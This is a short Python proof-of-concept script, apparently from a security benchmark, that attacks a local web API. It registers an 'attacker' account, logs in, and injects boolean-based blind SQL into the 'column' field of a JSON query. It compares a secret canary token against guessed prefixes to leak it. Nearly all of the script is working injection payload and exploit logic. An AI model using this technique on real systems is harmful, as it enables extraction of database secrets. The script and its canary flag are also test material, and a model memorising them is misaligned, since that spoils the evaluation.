import json, sys, urllib.parse
from pathlib import Path
HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[1]))
sys.path.insert(0, str(HERE))
import oracle

# 1) Original seed blocked on V1?
orig = oracle.run_original_probe("v1")
print("original probe v1:", json.dumps(orig)[:300])

# 2) Direct boolean differential demo
base = "http://127.0.0.1:39114"
oracle._register(base, "attacker", oracle.ATTACKER["email"], oracle.ATTACKER["password"])
tok = oracle._login(base, oracle.ATTACKER["email"], oracle.ATTACKER["password"])

def total(col_inj):
    query = json.dumps([{"column": col_inj, "operator": "fuzzy", "value": "XYZNOEXIST"}])
    url = f"{base}/api/world?query={urllib.parse.quote(query)}&page%5Bsize%5D=1"
    r = oracle._get_json(url, tok)
    return r.get("links", {}).get("total", 0)

# prefix PCBFLAG_e461ad58e6b3 (full) vs wrong prefix -> differential
good = "table_name) LIKE 'XYZNOEXIST' OR (SELECT token FROM pcb_canary ORDER BY id DESC LIMIT 1) GLOB 'PCBFLAG_e461ad58e6b3*' OR LOWER(table_name"
bad  = "table_name) LIKE 'XYZNOEXIST' OR (SELECT token FROM pcb_canary ORDER BY id DESC LIMIT 1) GLOB 'PCBFLAG_zzzz*' OR LOWER(table_name"
print("good prefix total:", total(good))
print("bad prefix total:", total(bad))
